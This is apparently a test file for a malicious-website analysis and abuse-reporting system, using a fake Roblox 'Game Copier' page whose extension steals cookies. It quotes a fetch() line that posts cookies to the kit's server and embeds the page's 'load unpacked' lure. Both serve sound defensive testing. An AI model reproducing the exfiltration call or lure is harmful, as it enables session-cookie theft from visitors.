import { describe, expect, test } from "bun:test";
import { Uint8ArrayReader, Uint8ArrayWriter, ZipWriter } from "@zip.js/zip.js";

import type { AnalysisClient } from "./analysis_run";
import { AbuseRepository } from "./abuse/repository";
import { SubmissionsEntity } from "./db/entities";
import { useTemporaryDatabase } from "./db/test_helpers";
import { websiteSubmissionDedupeKey } from "./submissions/website";
import { capturedDocumentContent, type WebsiteArchiveResult, type WebsitePageSession, type WebsiteVisitParams } from "./website_archive";
import { analyzeWebsite, type WebsiteAnalysisDependencies } from "./website_ai";
import { scriptedVisitSession, type ScriptedVisit } from "./site_visit/test_helpers";

useTemporaryDatabase();

/**
 * rbxcore.pro's "Game Copier" page (submission 380115867024756863): it
 * reads like a Roblox creator tool, and its dialog's button hands out a ZIP
 * the visitor loads into Chrome unpacked. Only the extension shows the harm:
 * it posts the visitor's Roblox session cookie, every other cookie of the
 * browser and their IP to the kit's server.
 */
const URL_ = "https://rbxcore.pro/game-copier/";
const PAGE = `<!DOCTYPE html><html><head><title>RBXCore — Game Copier</title></head><body>
<nav><a href="https://rbxcore.pro/">RBXCore</a><button class="btn-pill">Download</button></nav>
<h1>Game to Studio. One export.</h1><p>Open a Roblox game in Chrome, hit the extension, save a Studio-ready .rbxl. Export runs in the browser — no shady file hosts.</p>
<ol><li>Download and unzip Game-Copier.zip</li><li>chrome://extensions → Developer mode → Load unpacked</li><li>Sign in to Roblox, open a game → extension → Export .rbxl</li></ol>
<p>© 2026 RBXCore · Not affiliated with Roblox</p>
<div id="dlModal" class="dl-modal"><p>Install in Chrome: download the ZIP, go to chrome://extensions, enable Developer mode, and load unpacked.</p>
<button class="btn-w" id="dlConfirm">Download Game-Copier.zip</button></div></body></html>`;
const QUOTE = "fetch('https://rbxcore.pro/api/validate-cookie', {";

const EXTENSION = await (async () => {
	const writer = new ZipWriter(new Uint8ArrayWriter());
	for (const [name, file] of [["manifest.json", "game_copier_manifest.json.txt"], ["background.js", "game_copier_background.js.txt"]] as const) {
		await writer.add(name, new Uint8ArrayReader(new Uint8Array(await Bun.file(new URL(`./malware/fixtures/${file}`, import.meta.url)).arrayBuffer())));
	}
	return Buffer.from(await writer.close());
})();

function capture(session: WebsitePageSession): WebsiteArchiveResult {
	const { html, text } = capturedDocumentContent(PAGE);
	return {
		requestedUrl: URL_,
		url: URL_,
		hostname: "rbxcore.pro",
		navigationHops: [{ index: 0, url: URL_, hostname: "rbxcore.pro", status: 200, contentType: "text/html", contentCaptured: true }],
		archivedAt: new Date("2026-11-14T22:04:45Z"),
		route: "Tor exit",
		mhtml: Buffer.from(`From: <Saved by Blink>\r\nSnapshot-Content-Location: ${URL_}\r\n\r\n${PAGE}`),
		html: Buffer.from(html),
		text: Buffer.from(text),
		providerWarning: { provider: "Cloudflare", warning: "Suspected Malware" },
		session,
	};
}

type Answer = Record<string, unknown>;
const answer = (overrides: Answer): Answer => ({ finding: "benign", phishingBasis: "none", evidenceQuote: "", collectionFieldRefs: [], hiddenFrameRef: "", mobileHandoff: false, ...overrides });

/** Answers every classification the same way; records every prompt. */
function model(classification: Answer, prompts: Array<{ kind: string; prompt: string }>): AnalysisClient {
	return {
		responses: {
			create: async (options: { input: unknown; text?: unknown }) => {
				const prompt = JSON.stringify(options.input);
				const kind = options.text ? "classification" : "analysis";
				prompts.push({ kind, prompt });
				const text = kind === "analysis" ? "The page offers a browser extension that steals cookies." : JSON.stringify(classification);
				return (async function* () {
					yield { type: "response.completed", response: { id: `r${prompts.length}`, status: "completed", output: [{ type: "message", content: [{ type: "output_text", text }] }], usage: { total_tokens: 1 } } };
				})();
			},
		},
	} as unknown as AnalysisClient;
}

const DOWNLOAD = { url: "https://rbxcore.pro/Game-Copier.zip", fileName: "Game-Copier.zip", contentType: "application/zip", bytes: EXTENSION, userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/156.0.0.0" };

function scenario(params: { classification: Answer; visit?: ScriptedVisit }) {
	const prompts: Array<{ kind: string; prompt: string }> = [];
	const visits: WebsiteVisitParams[] = [];
	const session = scriptedVisitSession(params.visit ?? { downloads: [DOWNLOAD], agent: { report: { submissionsAttempted: 0, downloadsStarted: 1, asksForPhone: false, blockedByChallenge: false, stoppedReason: "Downloaded Game-Copier.zip." } } }, visits);
	const dependencies: WebsiteAnalysisDependencies = {
		getInfo: async () => ({ ip_rdaps: [] }),
		analysisClient: model(params.classification, prompts),
		timestampEvidence: async () => undefined,
		browserBackoffMs: [1],
		archiveWebsite: async () => capture(session),
		downloadLookups: async () => [{ provider: "virustotal", state: "not_found" }],
	};
	return { prompts, visits, dependencies };
}

async function submission(id: bigint) {
	await SubmissionsEntity.create({ id, kind: "website", data: { kind: "website", website: { url: URL_ } }, dedupeKey: `${websiteSubmissionDedupeKey(URL_)}-${id}`, status: "running", source: URL_ });
	return id;
}

const website = async (id: bigint) => {
	const stored = await SubmissionsEntity.get(id);
	return { stored, data: stored?.data.kind === "website" ? stored.data.website : undefined };
};

describe("a page whose harm is the file it offers", () => {
	test("the Game Copier page is judged by the extension its visit downloaded, which posts the visitor's cookies away, and reported with it", async () => {
		const { prompts, visits, dependencies } = scenario({ classification: answer({ finding: "malware", evidenceQuote: QUOTE }) });
		const id = await submission(380115867024756863n);
		await analyzeWebsite({ submissionId: id, url: URL_ }, dependencies);

		expect(visits).toHaveLength(1);
		expect(prompts.map(({ kind }) => kind)).toEqual(["classification", "analysis"]);
		for (const { prompt } of prompts) {
			expect(prompt).toContain("offered_download is the file the visit downloaded while this page was shown");
			expect(prompt).toContain(QUOTE);
		}
		expect(prompts[0]!.prompt).toContain("Cloudflare showed its own \\\"Suspected Malware\\\" warning page before this site");

		const { stored, data } = await website(id);
		expect(stored?.status).toBe("reported");
		expect(data?.offeredDownload).toMatchObject({
			pageUrl: URL_,
			url: "https://rbxcore.pro/Game-Copier.zip",
			fileName: "Game-Copier.zip",
			sizeBytes: EXTENSION.length,
			inspection: { format: "browser_extension", browserExtension: { name: "Game Copier", hostPermissions: ["<all_urls>"] } },
		});
		expect(data?.providerWarning).toEqual({ provider: "Cloudflare", warning: "Suspected Malware" });
		expect(data?.visit).toMatchObject({ outcome: "completed", report: { downloadsStarted: 1 } });
		expect(data?.siteAssessments?.[0]).toMatchObject({ finding: "malware", evidenceQuote: QUOTE, offeredDownload: { fileName: "Game-Copier.zip", sha256: data!.offeredDownload!.sha256 } });

		const report = await AbuseRepository.getReportForSubmission(id);
		expect(report!.description.split("\n")).toEqual(expect.arrayContaining([
			"The page distributes malware: it gets visitors to download, install, or run something that harms them.",
			'Cloudflare already shows its "Suspected Malware" warning before the site.',
			`The page offers the file "Game-Copier.zip" from https://rbxcore.pro/Game-Copier.zip: a browser extension (ZIP), ${EXTENSION.length} bytes, SHA-256 ${data!.offeredDownload!.sha256}. Our visit downloaded it from ${URL_}, as a visitor would, and inspected it without running it.`,
			'It is the browser extension "Game Copier" 1.6.9, with the permissions alarms, cookies, downloads, tabs, activeTab, scripting, storage, <all_urls>; it runs its code on https://www.roblox.com/*, https://roblox.com/*, https://*.roblox.com/*.',
			`Code in the file (background.js) that shows it: ${JSON.stringify(QUOTE)}.`,
		]));
		expect(report!.description).toContain("https://rbxcore.pro/api/validate-cookie");
		const input = await AbuseRepository.getReportInput(report!.id);
		const attached = input?.evidenceArtifacts.find(({ name }) => name.startsWith("offered-download-"));
		expect(JSON.parse(attached!.blob.toString("utf8"))).toMatchObject({ fileName: "Game-Copier.zip", sha256: data!.offeredDownload!.sha256 });
	});

	test("a quote that is in neither the page nor the file proves nothing", async () => {
		const { dependencies } = scenario({ classification: answer({ finding: "malware", evidenceQuote: "stealCookies(victim)" }) });
		const id = await submission(380115867024756864n);
		await analyzeWebsite({ submissionId: id, url: URL_ }, dependencies);
		const { stored, data } = await website(id);
		expect(stored?.status).toBe("invalid");
		expect(data?.siteAssessments?.[0]).toMatchObject({ finding: "insufficient_evidence", rejectedClaim: "its evidence quote does not appear verbatim in the captured page text" });
		expect(await AbuseRepository.getReportForSubmission(id)).toBeUndefined();
	});

	test("a visit that could not finish leaves a page that shows nothing by itself inconclusive, and visits it again", async () => {
		const { dependencies } = scenario({ classification: answer({}), visit: { agent: { outcome: "failed", failure: "failed: Error: the model answered HTTP 503", report: undefined } } });
		const id = await submission(380115867024756865n);
		await analyzeWebsite({ submissionId: id, url: URL_ }, dependencies);
		const { stored, data } = await website(id);
		expect(stored?.status).toBe("failed");
		expect(stored?.info).toStartWith("Inconclusive: the visit could not finish the site's flow: failed: Error: the model answered HTTP 503 The last page it reached");
		expect(data?.autoRetry?.attempts).toBe(1);
	});

	test("what the visit already proved stands, even when the agent failed afterwards", async () => {
		const { dependencies } = scenario({
			classification: answer({ finding: "malware", evidenceQuote: QUOTE }),
			visit: { downloads: [DOWNLOAD], agent: { outcome: "timed_out", failure: "The visit's 8-minute budget ended the walk.", report: undefined } },
		});
		const id = await submission(380115867024756866n);
		await analyzeWebsite({ submissionId: id, url: URL_ }, dependencies);
		const { stored, data } = await website(id);
		expect(stored?.status).toBe("reported");
		expect(data?.visit).toMatchObject({ outcome: "timed_out", failure: "The visit's 8-minute budget ended the walk." });
	});
});
